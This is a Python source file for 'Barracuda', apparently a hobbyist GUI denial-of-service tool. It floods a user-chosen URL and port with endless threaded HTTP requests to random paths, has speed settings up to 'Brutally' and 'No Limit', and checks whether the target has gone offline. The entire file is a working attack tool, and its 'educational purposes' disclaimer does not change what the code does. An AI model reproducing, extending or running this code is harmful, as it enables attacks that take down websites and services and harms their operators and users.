try:
          import tkinter as tk
          from tkinter import ttk
          from PIL import Image, ImageTk
          from colorama import Fore, init
          import socket
          import threading
          import string
          import random
          import platform
          import time
          import os
          import requests
          import queue
          import time
          import urllib3

except ModuleNotFoundError as e:
          print(f"{e} start setup.py")
          time.sleep(5)
          exit()

init()


def cls():
          if platform.system() == "Windows":
                    os.system("cls")
          else:
                    os.system("clear")


cls()

ascii_art = """

                            _                                                 _        
                            ( )                                               ( )       
                            | |_      _ _  _ __  _ __   _ _    ___  _   _    _| |   _ _ 
                            | '_`\  /'_` )( '__)( '__)/'_` ) /'___)( ) ( ) /'_` | /'_` )
                            | |_) )( (_| || |   | |  ( (_| |( (___ | (_) |( (_| |( (_| |
                            (_,__/'`\__,_)(_)   (_)  `\__,_)`\____)`\___/'`\__,_)`\__,_)



~ Tool created by barra-dev.
~ This tool was created for educational purposes. I am not responsible for your use of this tool.  

-----------------------------------------------------------------------------------------------------

"""

color_range = [Fore.BLUE, Fore.LIGHTBLUE_EX, Fore.WHITE, Fore.LIGHTBLACK_EX]
gradient_art = ""

for line in ascii_art.splitlines():
          for i, char in enumerate(line):
                    color = color_range[i % len(color_range)]
                    gradient_art += f"{color}{char}"
          gradient_art += "\n"

print(gradient_art)


class DDosGUI:
          def __init__(self, master):
                    self.master = master
                    self.master.title("Barracuda ~ By barra-dev")
                    self.master.configure(background='#333')

                    current_dir = os.path.dirname(os.path.abspath(__file__))

                    self.master.iconbitmap(os.path.join(current_dir, "img", "logo.jpg"))

                    background_image_path = os.path.join(current_dir, "img", "logo.jpg")
                    background_image = Image.open(background_image_path)
                    background_photo = ImageTk.PhotoImage(background_image)

                    self.background_label = tk.Label(self.master, image=background_photo)
                    self.background_label.image = background_photo
                    self.background_label.place(x=0, y=0, relwidth=1, relheight=1)

                    self.style = ttk.Style()
                    self.style.configure('TFrame', background='#333')
                    self.style.configure('TLabel', background='#333', foreground='white', font=('Arial', 12))
                    self.style.configure('TButton', background='#ff5733', foreground='white', font=('Arial', 12))

                    self.mainframe = ttk.Frame(master, style='TFrame')
                    self.mainframe.pack(pady=20)

                    self.status_code = False
                    self.id_loader = 0

                    self.create_ddos_interface()

                    self.status_label = ttk.Label(self.mainframe, text="Status: Unknown", foreground='white')
                    self.status_label.grid(row=5, column=0, columnspan=2, padx=5, pady=5, sticky="ew")

                    self.status_queue = queue.Queue()
                    self.update_status()

          def create_ddos_interface(self):
                    self.target_label = ttk.Label(self.mainframe, text="Target URL:", foreground='white')
                    self.target_entry = ttk.Entry(self.mainframe, width=50)

                    self.target_port_label = ttk.Label(self.mainframe, text="Target Port:", foreground='white')
                    self.target_port_entry = ttk.Entry(self.mainframe, width=10)

                    self.speed_label = ttk.Label(self.mainframe, text="Attack Speed:", foreground='white')
                    self.speed_combobox = ttk.Combobox(self.mainframe,
                                                       values=["Slow", "Medium", "Fast", "Very-fast", "Brutally",
                                                               "No Limit"])

                    self.start_button = ttk.Button(self.mainframe, text="Start Attack", command=self.start_attack,
                                                   style='TButton')
                    self.stop_button = ttk.Button(self.mainframe, text="Stop Attack", command=self.stop_attack,
                                                  state="disabled", style='TButton')

                    self.target_label.grid(row=0, column=0, padx=5, pady=5, sticky="e")
                    self.target_entry.grid(row=0, column=1, padx=5, pady=5, sticky="ew")
                    self.target_port_label.grid(row=1, column=0, padx=5, pady=5, sticky="e")
                    self.target_port_entry.grid(row=1, column=1, padx=5, pady=5, sticky="ew")
                    self.speed_label.grid(row=2, column=0, padx=5, pady=5, sticky="e")
                    self.speed_combobox.grid(row=2, column=1, padx=5, pady=5, sticky="ew")
                    self.start_button.grid(row=3, column=0, columnspan=2, padx=5, pady=5, sticky="ew")
                    self.stop_button.grid(row=4, column=0, columnspan=2, padx=5, pady=5, sticky="ew")

          def start_attack(self):
                    target_url = self.target_entry.get()
                    target_port = int(self.target_port_entry.get())
                    speed = self.speed_combobox.get().lower()

                    if not self.status_code:
                              self.status_code = True
                              threading.Thread(target=self.run_attack, args=(target_url, target_port, speed)).start()
                              self.start_button.configure(state="disabled")
                              self.stop_button.configure(state="normal")

          def stop_attack(self):
                    self.status_code = False
                    self.start_button.configure(state="normal")
                    self.stop_button.configure(state="disabled")

          def run_attack(self, target_url, target_port, speed):
                    target_ip = self.get_target_ip(target_url)
                    if target_ip:
                              # proxies = {
                              #           "http": "http://192.168.2.112:3128",
                              #           "https": "http://192.168.2.112:3128",
                              # }
                              urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

                              spam_loader = 5
                              create_thread = 5
                              booter_sent = 5000

                              while self.status_code:
                                        for i in range(create_thread):
                                                  threading.Thread(target=self.http_attack, args=(
                                                  target_ip, target_port, booter_sent, None)).start()
                                                  if speed != "no limit":
                                                            time.sleep(self.get_speed(speed))

          def get_target_ip(self, target_url):
                    try:
                              host = str(target_url).replace("https://", "").replace("http://", "").replace("www.",
                                                                                                            "").replace(
                                        "/", "")
                              return socket.gethostbyname(host)
                    except socket.gaierror:
                              return ""

          def http_attack(self, target_ip, target_port, booter_sent, proxies):
                    rps = 0
                    url_path = self.generate_url_path_choice(5)
                    try:
                              response = requests.get(f"http://{target_ip}:{target_port}/{url_path}", proxies=None,
                                                      timeout=5, verify=False)
                              print(f"{Fore.LIGHTBLUE_EX}http attack on {target_ip}:{target_port}")
                    except requests.RequestException as e:
                              print(f"{Fore.RED}Error during attack: {e}{Fore.RESET}")

          def generate_url_path_choice(self, num):
                    letter = string.ascii_letters + string.digits + string.punctuation
                    return ''.join(random.choice(letter) for _ in range(num))

          def get_speed(self, speed):
                    speed_map = {
                              'slow': 0.5,
                              'medium': 0.4,
                              'fast': 0.3,
                              'very-fast': 0.2,
                              'brutally': 0.00005,
                    }
                    return speed_map.get(speed, 0)

          def update_status(self):
                    threading.Thread(target=self.check_status).start()
                    self.master.after(3000, self.update_status)

          def check_status(self):
                    target_url = self.target_entry.get()
                    proxies = {
                              "http": "http://192.168.2.112:3128",
                              "https": "http://192.168.2.112:3128",
                    }
                    if target_url:
                              try:
                                        response = requests.get(target_url, proxies=None, timeout=5, verify=False)
                                        if response.status_code == 200:
                                                  status_text = "Status: Online"
                                        else:
                                                  status_text = f"Status: Error {response.status_code}"
                              except requests.RequestException:
                                        status_text = "Status: Offline"
                    else:
                              status_text = "Status: Unknown"

                    self.status_queue.put(status_text)
                    self.master.after(100, self.update_status_label)

          def update_status_label(self):
                    if not self.status_queue.empty():
                              status_text = self.status_queue.get()
                              self.status_label.config(text=status_text)


def main():
          root = tk.Tk()
          root.geometry("728x410")
          app = DDosGUI(root)
          root.mainloop()


if __name__ == "__main__":
          main()
